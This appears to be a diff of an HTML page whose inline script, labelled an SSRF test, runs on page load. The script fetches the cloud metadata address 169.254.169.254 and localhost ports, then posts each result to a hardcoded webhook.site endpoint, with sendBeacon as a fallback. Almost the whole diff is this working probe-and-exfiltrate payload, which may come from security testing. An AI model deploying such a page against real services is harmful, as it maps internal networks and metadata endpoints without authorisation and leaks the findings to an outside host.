@@ -29,48 +29,45 @@
 
     <script>
         const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
-        <script>
-const webhookUrl = 'https://webhook.site/YOUR-ID';
-
-async function sendToWebhook(data) {
-    try {
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-    } catch (e) {
-        console.error("Fetch failed, using beacon", e);
-        navigator.sendBeacon(webhookUrl, JSON.stringify(data));
-    }
-}
-
-async function runSSRFTest() {
-    const payloads = [
-        'http://169.254.169.254/',
-        'http://127.0.0.1:80',
-        'http://localhost:8080'
-    ];
-
-    for (const url of payloads) {
-        let result = {
-            type: "ssrf_test",
-            target: url,
-            status: "BLOCKED"
-        };
-
-        try {
-            const res = await fetch(url, { method: 'GET' });
-            result.status = "RESPONSE_RECEIVED";
-            result.httpStatus = res.status;
-        } catch (e) {
-            result.error = e.message;
+        async function sendToWebhook(data) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error("Fetch failed, using beacon", e);
+                navigator.sendBeacon(webhookUrl, JSON.stringify(data));
+            }
         }
-
-        console.log(result);
-        await sendToWebhook(result);
-    }
-}
+        
+        async function runSSRFTest() {
+            const payloads = [
+                'http://169.254.169.254/',
+                'http://127.0.0.1:80',
+                'http://localhost:8080'
+            ];
+        
+            for (const url of payloads) {
+                let result = {
+                    type: "ssrf_test",
+                    target: url,
+                    status: "BLOCKED"
+                };
+        
+                try {
+                    const res = await fetch(url, { method: 'GET' });
+                    result.status = "RESPONSE_RECEIVED";
+                    result.httpStatus = res.status;
+                } catch (e) {
+                    result.error = e.message;
+                }
+        
+                console.log(result);
+                await sendToWebhook(result);
+            }
+        }
 
 window.onload = runSSRFTest;
 </script>
